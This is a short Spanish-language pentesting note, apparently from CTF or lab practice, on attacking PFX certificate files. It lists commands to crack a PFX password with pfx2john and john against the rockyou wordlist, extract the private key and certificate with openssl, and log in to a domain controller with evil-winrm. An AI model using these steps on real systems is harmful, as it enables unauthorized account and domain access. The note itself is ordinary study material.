# Archivos .pfx

Tags: #Windows #PFX 

Archivo de certificado que puede incluir el certificado digital y su clave privada, normalmente protegido con contraseña. Se usa para autenticación o para instalar/importar certificados. También debe guardarse de forma segura.

### Archivos PFX / PKCS12 (certificados)
```bash
Paso 1:
# Crackear contraseña del PFX
❯ pfx2john legacy_dev_auth.pfx > pfx_hash.txt 
❯ john pfx_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Paso 2:
# Extraer contenido del PFX una vez que tienes la contraseña
❯ openssl pkcs12 -in cert.pfx -nocerts -out priv-key.pem -nodes
# Extraer clave privada → priv-key.pem

Paso 3:
❯ openssl pkcs12 -in cert.pfx -nokeys -out certificate.pem
# Extraer certificado → certificate.pem

Paso 4:
# Identificar a quien pertenece el certificado
❯ openssl x509 -in certificate.pem -noout -subject
```

```bash 
Paso 5:
# Autenticación via EvilWinRM 
❯ evil-winrm -i IP_DC -S -c certificate.pem -k priv-key.pem
```